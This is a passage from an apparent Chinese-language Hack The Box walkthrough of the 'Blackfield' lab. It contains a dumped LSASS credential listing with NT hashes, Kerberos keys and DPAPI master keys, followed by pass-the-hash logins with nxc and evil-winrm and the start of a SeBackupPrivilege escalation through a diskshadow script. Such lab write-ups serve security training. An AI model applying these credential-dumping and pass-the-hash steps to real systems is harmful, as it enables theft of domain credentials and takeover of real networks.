		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		AES256 Key: ec841e1e29ad7d6332a243b6b4ab445839829244408269850ab7c78a2cf45615
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [25869]==
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
		AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [633e3]==
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username 
domainname 
logon_server 
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed


```

审计发现三个 NT 值，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ vim hashs.txt    
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat hashs.txt      
Administrator    NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
svc_backup       NT: 9658d1d1dcd9250115e2205d9f48400d
DC01$            NT: b624dc83a27cc29da11d9bf25efea796
```

验证一下是否有效，发现 svc_backup 是有效的，且有 winrm 权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d   
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 

┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc winrm 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

使用 evil-winrm 登录，拿到 user flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ evil-winrm -i BLACKFIELD.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```

## 提权至 Administrator

查看一下权限，发现有 SeBackupPrivilege，可以作为提权的途径。

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

在 Kali 中制作提权脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt                                                                                
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ xxd dshadow.txt 
00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
00000020: 0d0a 6164 6420 766f 6c75 6d65 2063 3a20  ..add volume c: 
00000030: 616c 6961 7320 6364 7269 7665 0d0a 6372  alias cdrive..cr
00000040: 6561 7465 0d0a 6578 706f 7365 2025 6364  eate..expose %cd
00000050: 7269 7665 2520 7a3a 0d0a                 rive% z:..
```

上传至目标机器，并验证完整性。

挂载。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload dshadow.txt
                                        
Info: Uploading /home/kali/Work/Kali/Blackfield/dshadow.txt to C:\programdata\apps\dshadow.txt
                                        
Data: 120 bytes of 120 bytes copied
                                        
Info: Upload successful!
